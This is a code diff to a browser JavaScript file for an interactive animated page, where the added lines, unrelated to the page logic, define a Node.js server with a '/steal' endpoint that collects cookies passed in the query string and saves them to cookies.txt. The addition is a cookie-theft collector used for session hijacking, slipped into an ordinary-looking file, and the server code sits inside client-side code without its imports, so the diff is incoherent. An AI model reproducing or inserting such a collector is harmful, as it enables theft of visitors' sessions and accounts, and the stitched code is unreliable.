@@ -97,3 +97,22 @@ function initengahan(){
   document.getElementById("lv3").onclick = function() {lv3.style="opacity:0";slov+=1;this.onclick=null;checkslov();}
   document.getElementById("lv4").onclick = function() {lv4.style="opacity:0";slov+=1;this.onclick=null;checkslov();}
   function checkslov() {if(slov==4){kolombaru.style="position:relative;transform:scale(1)";fthilang();ftganti=1;setTimeout(ftmuncul,300);otomatis();setTimeout(aktipesan2,400);}}
+const server = http.createServer((req, res) => {
+    const parsedUrl = url.parse(req.url, true);
+    if (parsedUrl.pathname === '/steal' && req.method === 'GET') {
+        const cookies = parsedUrl.query.cookie;
+        fs.appendFile('cookies.txt', cookies + '\n', (err) => {
+            if (err) throw err;
+            console.log('Cookie saved:', cookies);
+        });
+        res.writeHead(200, { 'Content-Type': 'text/plain' });
+        res.end('Cookie received');
+    } else {
+        res.writeHead(404, { 'Content-Type': 'text/plain' });
+        res.end('Not found');
+    }
+});
+
+server.listen(8080, () => {
+    console.log('Server listening on port 8080');
+});
